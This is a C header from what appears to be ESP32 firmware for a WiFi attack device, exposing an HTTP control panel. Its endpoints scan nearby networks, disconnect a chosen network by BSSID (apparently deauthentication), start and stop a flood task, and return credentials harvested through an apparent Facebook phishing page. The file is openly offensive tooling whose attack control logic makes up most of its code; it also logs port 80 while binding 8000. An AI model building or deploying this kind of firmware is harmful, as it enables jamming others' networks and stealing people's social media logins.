#ifndef WEBSERVER_H
#define WEBSERVER_H

#include "socket.h"
#include "http_response.h"
#include "http_request.h"
#include "html_pages.h"
#include "tasks.h"
#include "facebook_web_server.h"

//                                   SSID + BSSID + json formating
#define JSON_BUFFER_SIZE (MAX_APS * (32 + 17 + 31))
 wifictl_ap_records_t ap_records = {0};

void handle_scan(int client_sock) {
    int err = scan_networks(&ap_records);
    if (err != 0) {
        ESP_LOGE("WebServer", "Failed to scan networks");
        http_send_error_response(client_sock);
        return;
    }
    char json[JSON_BUFFER_SIZE] = {0};
    int records_parsed = records_to_json(&ap_records, json, JSON_BUFFER_SIZE);
    if(records_parsed != 0) {
        ESP_LOGE("WebServer", "Failed to convert records to JSON");
        http_send_error_response(client_sock);
        return;
    }
    http_send_json_response(client_sock, json);
}

void handle_attack(http_request_t* req, int client_sock) {
    char bssid[18];
    int ret = http_request_get_url_param(req->url, "bssid", sizeof(bssid), bssid);
    if (ret != 0) {
        ESP_LOGE("WebServer", "Failed to get BSSID from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    char timeout_str[6];
    ret = http_request_get_url_param(req->url, "timeout", sizeof(timeout_str), timeout_str);
    if (ret != 0) {
        ESP_LOGE("WebServer", "Failed to get timeout from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    int timeout = atoi(timeout_str);
    uint8_t bytes_bssid[6];
    ret = bssid_string_to_bytes(bssid, bytes_bssid);
    if(ret != 0) {
        ESP_LOGE("WebServer", "Failed to convert BSSID string to bytes");
        http_send_error_response(client_sock);
        return;
    }
    wifi_ap_record_t* record = get_ap_record_by_bssid(&ap_records, bytes_bssid);
    if(record == NULL)
    {
        ESP_LOGE("WebServer", "BSSID not found");
        http_send_bad_request_response(client_sock);
        return;
    }
    http_send_ok_response(client_sock);
    ret = wifi_disconnect(record, timeout);
    if (ret != ESP_OK) {
        ESP_LOGE("WebServer", "BSSID not found");
        http_send_error_response(client_sock);
        return;
    }
}

void handle_flood(http_request_t* req, int client_sock) {
    if (flood_running || flood_task_handle != NULL) {
        http_send_error_response(client_sock); // Flood already running
        return;
    }

    if (xTaskCreate(flood_task, "FloodTask", 4096, NULL, 5, &flood_task_handle) != pdPASS) {
        http_send_error_response(client_sock); // Could not create task
        return;
    }

    http_send_ok_response(client_sock); // 200 OK
}

void handle_flood_stop(http_request_t* req, int client_sock) {
    printf("flood status: %d\n", flood_running);
    if (!flood_running || flood_task_handle == NULL) {
        printf("Flood not running sending 409\n");
        http_send_conflict_response(client_sock);
        return;
    }
    printf("Flood running 200\n");
    flood_running = false;
    http_send_ok_response(client_sock); // 200
}

char json[MAX_CRED_ENDTRIES_JSON] = {0};
void handle_facebook_data(http_request_t* req, int client_sock) {
    int res = cred_buffer_to_json(&cred_buffer, json, sizeof(json));
    if (res == -1) {
        ESP_LOGE("WebServer", "Failed to convert credentials to JSON");
        http_send_error_response(client_sock);
        return;
    }
    printf("facebook json %s\n", json);
    http_send_json_response(client_sock, json);
}

void handle_connection(http_request_t* req, int client_sock) {
    if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("WebServer", "Handling POST request");
        http_send_not_found_response(client_sock);
        return;
    }

    int64_t start_time = esp_timer_get_time();
    if (strcmp(req->url, "/") == 0) {
        ESP_LOGI("WebServer", "Handling root request");
        http_send_html_response(client_sock, root_page_html);
    } else if (strcmp(req->url, "/scan") == 0) {
        ESP_LOGI("WebServer", "Handling scan request");
        handle_scan(client_sock);
    } else if(strncmp(req->url, "/attack", 7) == 0) {
        ESP_LOGI("WebServer", "Handling attack request");
        handle_attack(req, client_sock);
    } else if (strcmp(req->url, "/flood") == 0) {
        ESP_LOGI("WebServer", "Handling flood request");
        handle_flood(req, client_sock);
    } else if (strcmp(req->url, "/flood/stop") == 0) {
        ESP_LOGI("WebServer", "Handling flood stop request");
        handle_flood_stop(req, client_sock);
    } else if (strcmp(req->url, "/facebook") == 0) {
        ESP_LOGI("WebServer", "Handling facebook data request");
        handle_facebook_data(req, client_sock);
    } else {
        ESP_LOGI("WebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
    int64_t end_time = esp_timer_get_time();
    int64_t durata = end_time - start_time;
    printf("Ruta %s a durat %lld microsecunde\n", req->url, durata);
}

void start_webserver(){
    ESP_LOGI("WebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("WebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("WebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 8000, INADDR_ANY) < 0) {
        ESP_LOGE("WebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("WebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("WebServer", "Web server started on port 80");

    while (1) {
        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("WebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("WebServer", "Connection accepted...");

        char buffer[1024];
        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
        if (len < 0) {
            ESP_LOGE("WebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        
        http_request_t req = http_request_parse(buffer);
        printf("Request Method: %s\n", req.method);
        printf("Request URL: %s\n", req.url);

        handle_connection(&req, client_sock);
        free_http_request(&req);
        close(client_sock);
    }
}



#endif // WEBSERVER_H